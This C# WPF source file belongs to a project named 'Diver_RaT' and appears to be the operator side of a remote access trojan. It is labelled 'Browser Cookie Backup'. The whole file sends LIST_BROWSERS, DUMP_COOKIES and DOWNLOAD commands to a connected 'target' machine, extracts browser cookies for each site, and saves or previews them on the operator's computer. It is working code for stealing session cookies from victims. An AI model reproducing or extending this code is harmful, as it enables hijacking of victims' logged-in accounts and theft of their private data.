using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Media;
using System.Windows.Threading;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class BrowserWindow : Window
    {
        private readonly TcpServer _server;
        private readonly Device _device;
        private readonly ObservableCollection<BrowserItem> _browsers = new();
        private readonly ObservableCollection<CookieFileItem> _files = new();
        private readonly DispatcherTimer _animTimer;
        private readonly Run _spinnerRun = new("") { Foreground = TerminalBrush("#8AA7FF") };
        private readonly Run _cursorRun = new("") { Foreground = TerminalBrush("#B4FF00") };
        private bool _cursorVisible = true;
        private bool _busy;
        private int _spin;

        public BrowserWindow(TcpServer server, Device device)
        {
            InitializeComponent();
            _server = server;
            _device = device;
            Title = $"Browser Cookie Backup - {device.ComputerName}";
            TargetText.Text = $"{device.ComputerName} ({device.IpAddress})";
            BrowserList.ItemsSource = _browsers;
            var filesView = CollectionViewSource.GetDefaultView(_files);
            filesView.Filter = FilterFiles;
            FilesList.ItemsSource = filesView;

            TermBox.Inlines.Add(_spinnerRun);
            TermBox.Inlines.Add(_cursorRun);

            _animTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(450) };
            _animTimer.Tick += (_, _) =>
            {
                _cursorVisible = !_cursorVisible;
                _cursorRun.Text = _cursorVisible ? "█" : "";
                if (_busy)
                {
                    _spin = (_spin + 1) % 4;
                    _spinnerRun.Text = " " + (new[] { "|", "/", "-", "\\" }[_spin]);
                    BusyDot.Visibility = Visibility.Visible;
                }
                else
                {
                    _spinnerRun.Text = "";
                    BusyDot.Visibility = Visibility.Hidden;
                }
                TermScroll.ScrollToEnd();
            };
            _animTimer.Start();

            Term("$", "ready - press Detect Browsers to scan the target");
        }

        private void Window_Closing(object sender, CancelEventArgs e)
        {
            _animTimer.Stop();
        }

        private async void DetectButton_Click(object sender, RoutedEventArgs e)
        {
            if (_busy) return;
            SetBusy(true);
            Term("$", $"detect browsers on {_device.ComputerName}...");
            var result = await _server.SendCommandAsync(_device.Id, "LIST_BROWSERS", timeoutMs: 30000);
            if (!result.Success)
            {
                Term("x", $"detection failed: {result.Error}");
                SetBusy(false);
                return;
            }

            try
            {
                using var doc = JsonDocument.Parse(result.Result ?? "[]");
                var found = new List<string>();
                foreach (var b in doc.RootElement.EnumerateArray())
                {
                    var id = b.TryGetProperty("id", out var i) ? i.GetString() : "";
                    var name = b.TryGetProperty("name", out var n) ? n.GetString() : id;
                    int profiles = 0;
                    if (b.TryGetProperty("profiles", out var pr)) profiles = pr.GetArrayLength();
                    _browsers.Add(new BrowserItem { Id = id ?? "", Name = name ?? id ?? "", Profiles = profiles });
                    found.Add(name ?? id ?? "");
                }
                Term("+", $"{_browsers.Count} browser(s) found: {string.Join(", ", found)}");
                BackupButton.IsEnabled = _browsers.Count > 0;
            }
            catch (Exception ex)
            {
                Term("x", $"could not parse response: {ex.Message}");
            }
            SetBusy(false);
        }

        private async void BackupButton_Click(object sender, RoutedEventArgs e)
        {
            var selected = _browsers.Where(b => b.IsChecked).ToList();
            if (selected.Count == 0)
            {
                Term("!", "no browsers selected - check at least one");
                return;
            }
            if (_busy) return;
            SetBusy(true);

            foreach (var browser in selected)
            {
                Term("$", $"backup cookies for {browser.Name}...");
                var result = await _server.SendCommandAsync(_device.Id, "DUMP_COOKIES",
                    new Dictionary<string, string> { ["browser"] = browser.Id }, timeoutMs: 60000);
                if (!result.Success)
                {
                    Term("x", $"backup failed: {result.Error}");
                    continue;
                }

                try
                {
                    using var doc = JsonDocument.Parse(result.Result ?? "{}");
                    var root = doc.RootElement;
                    var folder = root.TryGetProperty("folder", out var f) ? f.GetString() : "";
                    var total = root.TryGetProperty("total", out var t) ? t.GetInt64() : 0;
                    foreach (var file in root.GetProperty("files").EnumerateArray())
                    {
                        var site = file.TryGetProperty("site", out var s) ? s.GetString() : "";
                        var path = file.TryGetProperty("path", out var p) ? p.GetString() : "";
                        var cookies = file.TryGetProperty("cookies", out var c) ? c.GetInt64() : 0;
                        var size = file.TryGetProperty("size", out var sz) ? sz.GetInt64() : 0;
                        if (file.TryGetProperty("error", out var err))
                        {
                            Term("!", $"  {site}: {err.GetString()}");
                            continue;
                        }
                        _files.Add(new CookieFileItem
                        {
                            Site = site ?? "",
                            Path = path ?? "",
                            Browser = browser.Name,
                            BrowserId = browser.Id,
                            Cookies = cookies,
                            Size = size
                        });
                        Term("+", $"  {site}  {cookies} cookies  {FormatSize(size)}");
                    }
                    Term("+", $"{browser.Name}: {total} cookies exported -> {folder}");
                }
                catch (Exception ex)
                {
                    Term("x", $"could not parse backup result: {ex.Message}");
                }
            }

            DownloadButton.IsEnabled = _files.Count > 0;
            PreviewButton.IsEnabled = _files.Count > 0;
            StatusText.Text = $"{_files.Count} cookie file(s) exported on {_device.ComputerName}";
            UpdateFilterCount();
            SetBusy(false);
        }

        private async void DownloadButton_Click(object sender, RoutedEventArgs e)
        {
            var files = _files.Where(x => !string.IsNullOrEmpty(x.Path)).ToList();
            if (files.Count == 0)
            {
                Term("!", "nothing to download - run Backup Selected first");
                return;
            }
            if (_busy) return;

            var deviceDir = DownloadSink.DeviceFolder(this, _device.ComputerName);
            if (string.IsNullOrEmpty(deviceDir)) return;

            SetBusy(true);
            int ok = 0;
            foreach (var file in files)
            {
                var result = await _server.SendCommandAsync(_device.Id, "DOWNLOAD",
                    new Dictionary<string, string> { ["path"] = file.Path }, timeoutMs: 30000);
                if (!result.Success || string.IsNullOrEmpty(result.Result))
                {
                    Term("x", $"  download {file.Site}: {result.Error}");
                    continue;
                }
                try
                {
                    var bytes = Convert.FromBase64String(result.Result);
                    var dir = Path.Combine(deviceDir, file.BrowserId);
                    Directory.CreateDirectory(dir);
                    var target = Path.Combine(dir, file.Site + ".txt");
                    await File.WriteAllBytesAsync(target, bytes);
                    file.LocalPath = target;
                    Term("+", $"  saved {file.Site}.txt  ({bytes.Length:N0} bytes)");
                    ok++;
                }
                catch (Exception ex)
                {
                    Term("x", $"  save {file.Site}: {ex.Message}");
                }
            }
            Term("+", $"download complete: {ok}/{files.Count} file(s) -> {deviceDir}");
            StatusText.Text = $"{ok}/{files.Count} files saved to {deviceDir}";
            SetBusy(false);
        }

        private async void PreviewButton_Click(object sender, RoutedEventArgs e)
        {
            if (FilesList.SelectedItem is not CookieFileItem file || string.IsNullOrEmpty(file.Path))
            {
                Term("!", "select a site file to preview");
                return;
            }
            if (_busy) return;
            SetBusy(true);
            Term("$", $"fetch {file.Site} ({file.Cookies} cookies)...");
            var result = await _server.SendCommandAsync(_device.Id, "DOWNLOAD",
                new Dictionary<string, string> { ["path"] = file.Path }, timeoutMs: 30000);
            if (!result.Success || string.IsNullOrEmpty(result.Result))
            {
                Term("x", $"preview failed: {result.Error}");
                SetBusy(false);
                return;
            }
            try
            {
                var text = Encoding.UTF8.GetString(Convert.FromBase64String(result.Result));
                var preview = new PreviewWindow(
                    $"{file.Site}  ({file.Cookies} cookies, {text.Split('\n').Length} lines)", text, file.Site)
                {
                    Owner = this
                };
                preview.Show();
                Term("+", $"preview ready ({text.Length:N0} chars)");
            }
            catch (Exception ex)
            {
                Term("x", $"preview failed: {ex.Message}");
            }
            SetBusy(false);
        }

        private void ClearButton_Click(object sender, RoutedEventArgs e)
        {
            TermBox.Inlines.Clear();
            TermBox.Inlines.Add(_spinnerRun);
            TermBox.Inlines.Add(_cursorRun);
        }

        private void SetBusy(bool busy)
        {
            _busy = busy;
            DetectButton.IsEnabled = !busy;
            BackupButton.IsEnabled = !busy && _browsers.Count > 0;
            DownloadButton.IsEnabled = !busy && _files.Count > 0;
            PreviewButton.IsEnabled = !busy && _files.Count > 0;
        }

        private void SearchBox_TextChanged(object sender, TextChangedEventArgs e)
        {
            CollectionViewSource.GetDefaultView(_files).Refresh();
            UpdateFilterCount();
        }

        private bool FilterFiles(object item)
        {
            var query = SearchBox.Text?.Trim();
            if (string.IsNullOrEmpty(query)) return true;
            return ((CookieFileItem)item).Site.Contains(query, StringComparison.OrdinalIgnoreCase);
        }

        private void UpdateFilterCount()
        {
            if (FilterCount is null) return;
            var view = CollectionViewSource.GetDefaultView(_files);
            var shown = view.Cast<object>().Count();
            FilterCount.Text = $"{shown}/{_files.Count} files";
        }

        private void Term(string kind, string text)
        {
            var color = kind switch
            {
                "$" => "#D6FF7A",
                "+" => "#7CFF7C",
                "!" => "#FFD75C",
                "x" => "#FF6B6B",
                _ => "#E6E8EF"
            };
            var prefix = kind switch
            {
                "$" => ">",
                "+" => "+",
                "!" => "!",
                "x" => "x",
                _ => " "
            };
            TermBox.Inlines.InsertBefore(_spinnerRun, new Run($" {prefix} {text}\n") { Foreground = TerminalBrush(color) });
            TermScroll.ScrollToEnd();
        }

        private static SolidColorBrush TerminalBrush(string hex) =>
            new((Color)ColorConverter.ConvertFromString(hex));

        public static string FormatSize(long bytes)
        {
            if (bytes < 1024) return $"{bytes} B";
            if (bytes < 1024 * 1024) return $"{bytes / 1024.0:0.0} KB";
            if (bytes < 1024 * 1024 * 1024) return $"{bytes / (1024.0 * 1024):0.0} MB";
            return $"{bytes / (1024.0 * 1024 * 1024):0.0} GB";
        }
    }

    public class BrowserItem : INotifyPropertyChanged
    {
        public string Id { get; set; } = "";
        public string Name { get; set; } = "";
        public int Profiles { get; set; }
        public string Details => $"{Profiles} profile(s)";

        private bool _isChecked;
        public bool IsChecked
        {
            get => _isChecked;
            set
            {
                if (_isChecked == value) return;
                _isChecked = value;
                PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(nameof(IsChecked)));
            }
        }

        public event PropertyChangedEventHandler? PropertyChanged;
    }

    public class CookieFileItem : INotifyPropertyChanged
    {
        public string Site { get; set; } = "";
        public string Path { get; set; } = "";
        public string Browser { get; set; } = "";
        public string BrowserId { get; set; } = "";
        public long Cookies { get; set; }
        public long Size { get; set; }
        public string SizeText => BrowserWindow.FormatSize(Size);

        private string _localPath = "";
        public string LocalPath
        {
            get => _localPath;
            set
            {
                _localPath = value;
                PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(nameof(LocalPath)));
            }
        }

        public event PropertyChangedEventHandler? PropertyChanged;
    }
}
